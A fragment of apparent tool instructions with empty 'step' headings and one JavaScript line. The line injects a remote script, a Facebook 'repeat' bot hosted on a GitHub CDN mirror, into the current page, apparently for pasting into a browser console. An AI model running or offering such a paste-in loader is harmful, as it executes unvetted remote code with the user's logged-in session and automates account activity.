## step3:

## step4:

>JavaScript: var i = document.createElement('script'); i.src = "https://raw.githack.com/toan06/EZ/main/fb/tools/bot/repeat.js"; document.getElementsByTagName('head')[0].appendChild(i);
------------------------------------
